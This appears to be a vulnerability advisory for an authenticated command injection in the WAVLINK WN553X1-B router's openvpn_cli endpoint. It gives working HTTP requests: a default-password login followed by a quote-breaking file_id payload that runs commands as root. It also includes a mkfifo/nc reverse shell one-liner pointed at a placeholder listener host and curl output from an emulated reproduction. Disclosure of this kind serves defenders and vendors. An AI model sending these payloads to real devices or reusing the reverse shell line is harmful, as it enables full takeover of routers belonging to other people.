# WAVLINK WN553X1-B Router — openvpn_cli Command Injection

- Vendor: WAVLINK
- Product: WAVLINK WN553X1-B (Model WN553X3B)
- Firmware Version: V260403_2.0.0 (OpenWrt 21.02, aarch64 / MT7981)
- Vulnerability Type: Authenticated Command Injection (CWE-78)

## Overview

An authenticated command injection vulnerability was identified in the WAVLINK WN553X1-B router. An attacker with a valid session can send a crafted HTTP POST request to achieve arbitrary command execution with root privileges on the target device. The issue can be triggered via the following endpoint:

`POST /protocol.csp?fname=system&opt=openvpn_cli&function=set HTTP/1.1`

Successful exploitation requires a valid session token (obtainable via the `opt=login` endpoint; factory-default password is `admin`).

## Vulnerability Details

The vulnerability resides in the `sub_416568` function of `/bin/ioos` (the `.csp` back-end on 127.0.0.1:81, behind lighttpd). The user-controlled `file_id` parameter is passed to `snprintf` without proper input validation (only a space check via `strchr`), and the resulting string is forwarded to `popen`:

![image-202608081712093](../images/05.png)

![image-202608081712](../images/06.png)



```
snprintf(buf, 0x200, "uci show ovpnclient | grep \"file_id='%s'\"", file_id);
popen(buf, "r");   // 0x4167C8
```

Because the user input is embedded inside double quotes, a `file_id` value such as `a";COMMAND;"` breaks out of the quoted string and injects an arbitrary OS command, executed with root privileges (ioos runs as root).

Note: the response may report `error: 10001` because a subsequent uci operation fails, but the injected command has already been executed by that point — success should be judged by the command's side effects, not the response code.

## Proof of Concept

Note: the ioos HTTP parser only processes parameters in the URL query string of POST requests; the session token is passed as the `token` URL parameter (bound to the client IP, 300-second validity).

Step 1 — login (`usrid` = SHA256 of the password, default `admin`):

```http
POST /protocol.csp?fname=system&opt=login&function=set&usrid=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1
Host: <target>
Content-Length: 0
Connection: close

```

Response: `{ ..., "token": "<32 hex chars>", "error": 0 }`

Step 2 — command injection (the additional parameters are required to reach the vulnerable branch):

```http
POST /protocol.csp?fname=system&opt=openvpn_cli&function=set&file_id=a%22%3B/usr/bin/id%3E/tmp/pwn%3B%22&ovpn_enable=1&sel_pwd_val=1&usr_name=a&usr_passwd=b&token=<TOKEN> HTTP/1.1
Host: <target>
Content-Length: 0
Connection: close

```

The URL-decoded `file_id` payload is `a";/usr/bin/id>/tmp/pwn;"`, and `/tmp/pwn` on the device then contains `uid=0(root) gid=0(root) groups=0(root)`.

A reverse shell payload (busybox nc has no `-e`; nc resides at `/usr/bin/nc`):

```
a";rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/usr/bin/nc <LHOST> <LPORT> >/tmp/f;"
```

## Impact

An authenticated attacker can execute arbitrary OS commands with **root** privileges, resulting in full compromise of the device. Combined with the factory-default credential `admin` (hardcoded in `/etc/config/winstar`), the authentication barrier is effectively absent on devices where the password was never changed.

## Reproduction Result

Dynamically verified against the firmware emulated with qemu-aarch64 + chroot (lighttpd front-end proxying to ioos):

```
$ curl -X POST "http://<target>/protocol.csp?fname=system&opt=openvpn_cli&function=set&file_id=a%22%3B/usr/bin/id%3E/tmp/v_ovpncli%3B%22&ovpn_enable=1&sel_pwd_val=1&usr_name=a&usr_passwd=b&token=<TOKEN>"
{ "opt": "openvpn_cli", "fname": "system", "function": "set", "error": 10001 }

$ cat /tmp/v_ovpncli    # on the emulated device - injected command executed despite the error code
uid=0(root) gid=0(root) groups=0(root)
```
